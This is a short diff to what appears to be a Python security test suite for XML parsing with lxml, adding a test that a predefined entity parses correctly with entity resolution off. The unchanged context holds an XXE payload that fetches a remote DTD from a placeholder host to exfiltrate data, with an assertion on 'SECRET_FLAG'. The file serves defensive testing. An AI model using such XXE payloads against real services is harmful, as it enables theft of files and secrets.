@@ -74,6 +74,10 @@ exfiltrate_through_dtd_retrieval = f"""<?xml version="1.0"?>
 <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://{HOST}:{PORT}/exfiltrate-through.dtd"> %xxe; ]>
 """
 
+predefined_entity_xml = """<?xml version="1.0"?>
+<test>&lt;</test>
+"""
+
 # ==============================================================================
 # other setup
 
@@ -442,6 +446,13 @@ class TestLxml:
             lxml.etree.fromstring(exfiltrate_through_dtd_retrieval, parser=parser)
 
         assert exfiltrated_data == "SECRET_FLAG"
+
+    @staticmethod
+    def test_predefined_entity():
+        parser = lxml.etree.XMLParser(resolve_entities=False)
+        root = lxml.etree.fromstring(predefined_entity_xml, parser=parser)
+        assert root.tag == "test"
+        assert root.text == "<"
 
 # ==============================================================================
 
